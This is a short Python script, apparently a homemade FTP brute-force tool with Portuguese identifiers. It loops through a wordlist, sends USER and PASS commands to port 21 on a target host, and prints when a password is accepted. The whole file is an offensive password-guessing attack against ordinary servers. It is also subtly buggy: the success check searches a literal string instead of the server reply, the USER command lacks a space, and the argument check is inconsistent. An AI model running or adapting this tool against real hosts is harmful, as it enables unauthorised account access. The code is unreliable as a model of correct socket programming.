#coding: utf-8
#!/usr/bin/python3
import socket
import re
import sys

if len(sys.argv) < 2:
    print("Use python bruteftp.py 127.0.0.1 user")
    sys.exit(0)

usuario = sys.argv[2]

file = open("lista.txt") # <-- your wordlist
for linha in file.readlines():

    print(f"Testing with {usuario}:{linha}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((sys.argv[1],21))
    s.recv(1024)
    s.send(bytes("USER" + usuario + "\r\n", "utf-8"))
    s.recv(1024)
    s.send(bytes("PASS "+linha+"\r\n", "utf-8"))
    resulta = s.recv(1024)
    s.send(bytes("QUIT\r\n", "utf-8"))

    if re.search("230", "resulta"):
        print(f"[+] ===>>> PASSWORD FOUND <<<=== {linha}")
        break
    else:
        print("[-] ACESS DENIED [-]")
